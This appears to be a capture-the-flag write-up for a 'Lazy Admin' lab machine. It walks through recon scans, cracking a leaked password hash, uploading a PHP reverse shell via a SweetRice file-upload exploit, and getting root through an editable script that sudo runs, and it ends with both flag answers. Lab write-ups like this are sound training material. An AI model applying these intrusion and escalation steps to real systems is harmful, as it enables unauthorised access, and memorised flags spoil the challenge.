## IP=10.10.38.201


# Lazy Admin #

### Approach:
	
1. Ran nmap scan: `nmap -sC -sV -oN nmap/initial $IP`
	* SSH
	* Apache 2.4.16 server

2. Ran gobuster on `/`: `gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,sh -o gobuster/initial`
	* Found `/content`.

3. Ran gobuster on `/content`: `gobuster dir -u http://$IP/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,sh -o gobuster/initial`
	* `/content/as/` - login portal.
	* `/content/inc/` - useful files.

4. Downloaded the `mysql_bakup_20191129023059-1.5.1.sql` from `/content/inc/` and was able to find the username, `manager`, and the password, `42f749ade7f9e195bf475f37a44cafcb`.
	* Use hashcat to decrypt the password: `hashcat -a 0 -m 0 passwd.hash /usr/share/wordlists/rockyou.txt`
	* Username: `manager`
	* Password: `Password123`

5. With the known username and password, I used searchsploit to find arbitrary file upload exploit.
	* `searchsploit sweetrice`
	* `cp /usr/share/exploitdb/exploits/php/webapps/40716.py sweet-rice-file-upload.py`

6. Created a copy of a php reverse shell into my directory and renamed it to `index.php5`.
	* `mv /usr/share/webshells/php/php-reverse-shell.php index.php5`

7. Use the arbitrary file upload exploit to upload my reverse shell onto the machine.
	* `python3 sweet-rice-file-upload.py` with the following details:
		* Hostname: `$IP/content`
		* Username: `manager`
		* Password: `Password123`
		* File: `index.php5`

8. Start a netcat listener locally and navigate to the uploaded reverse shell, `http://$IP/content/attachment/index.php5`. You should now have access to the box.

9. User.txt flag is at `/home/itguy/user.txt`.

10. Found potential mysql login credentials at `/home/itguy/mysql_login.txt`.
	* Username: `rice`
	* Password: `randompass`
	* Didn't mean anything. There was no important information inside the database.

11. Ran `sudo -l` to see if I could run any commands as root/sudo.
	* Output: `(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl`
	* Tried editting the `/home/itguy/backup.pl` file, but couldn't. However, the backup.pl file made a call to another file, `/etc/copy.sh`, which I could edit.
	* Replaced everything within `/etc/copy.sh` with `/bin/bash -p`, then executed the command: `sudo /usr/bin/perl /home/itguy/backup.pl` and BOOM, root shell.


### Questions:

1. What is the user flag?

```
THM{63e5bce9271952aad1113b6f1ac28a07}
```

2. What is the root flag?

```
THM{6637f41d0177b6f37cb20d775124699f}
```